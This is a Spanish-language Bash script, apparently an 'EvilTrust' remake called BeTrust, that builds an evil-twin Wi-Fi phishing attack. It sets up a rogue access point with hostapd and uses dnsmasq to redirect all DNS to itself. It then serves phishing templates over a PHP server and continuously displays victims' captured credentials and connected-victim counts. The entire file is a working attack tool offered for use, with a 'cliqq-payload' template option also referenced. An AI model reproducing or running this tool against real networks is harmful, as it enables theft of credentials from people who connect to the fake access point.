#!/bin/bash

# Todo
# Comprobación CtrlC, mejorar plantillas, cambiar banner, cambiar lo de datos privados, devnull en el dnsqmasq/otro, 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Saliendo...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 
	rm -r iface 
	find \-name datos-privados.txt
	sleep 3; ifconfig $choosed_interface down; sleep 1
	iwconfig $choosed_interface mode monitor; sleep 1
	ifconfig $choosed_interface up; sudo airmon-ng stop $choosed_interface; sleep 1
	tput cnorm; service NetworkManager restart
	clear
	echo Gracias por usar BeTrust!
	exit 0
}

function banner(){
echo -e "${redColour} ____  ____  ____  ____  __  __  ___  ____ 
(  _ \( ___)(_  _)(  _ \(  )(  )/ __)(_  _)
 ) _ < )__)   )(   )   / )(__)( \__ \  )(  
(____/(____) (__) (_)\_)(______)(___/ (__) ${endColour}

EvilTrust reimaginado."
sleep 3
}

function dependencies(){
	counter=0
	dependencias=(php dnsmasq hostapd)
	for programa in "${dependencias[@]}"; do
		if [ "$(command -v $programa)" ]; then
			let counter+=1
		fi;
	done

	if [ "$(echo $counter)" == "3" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
	else
		echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n"
		tput cnorm; exit
	fi
}

function getCredentials(){
	clear
	activeHosts=0
	tput civis; while true; do
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
		find \-name datos-privados.txt | xargs cat
		find \-name datos-privados.txt | xargs cat > resultados.txt
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
		sleep 3; clear
	done
}

function startAttack(){
	clear
	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Interfaz a poner en modo monitor: ${endColour}" && read toponmon
	clear
	sudo airmon-ng start $toponmon >/dev/null;
	clear
	interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface

		for interface in $(cat iface); do
			if [ "$choosed_interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
	done

	rm iface 
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
	echo -e "\n${yellowColour}[!] Preparando conexiones...${endColour}\n"
	sleep 2
	killall NetworkManager hostapd dnsmasq wpa_supplicant dhcpd 
	sleep 5

	echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
	clear
	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
	sleep 2
	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	nohup hostapd hostapd.conf &
	sleep 6

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=192.168.1.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	sudo ifconfig $choosed_interface 192.168.1.1 netmask 255.255.255.0 up
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	nohup dnsmasq -C dnsmasq.conf -d & 
	sleep 5

	# Array de plantillas
	plantillas=$(find ./templates -maxdepth 1 -type d -not -name "images" | sed 's#./templates/##')
	clear
	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (${plantillas}):${endColour} " && read template

	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
		if [ "$plantilla" == "$template" ]; then
			check_plantillas=1
		fi
	done

	if [ "$template" == "cliqq-payload" ]; then
		check_plantillas=2
	fi

	if [ $check_plantillas -eq 1 ]; then
		tput civis; pushd templates/$template 
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		nohup php -S 192.168.1.1:80 &
		sleep 2
		popd; getCredentials
	else
		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
		pushd templates/$template 
		nohup php -S 192.168.1.1:80 &
		sleep 2
		popd; getCredentials
	fi
}

# Main Program

if [ "$(id -u)" == "0" ]; then
    if [[ "$1" == "reset" ]]; then
        find "." -name "datos-privados.txt" -delete
		echo "Se han eliminado todos los archivos 'datos-privados.txt' en las plantillas."
		echo "Los resultados de la última ejecución estarán en resultados.txt"
    else
        tput civis
        banner
        dependencies
        startAttack
    fi
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
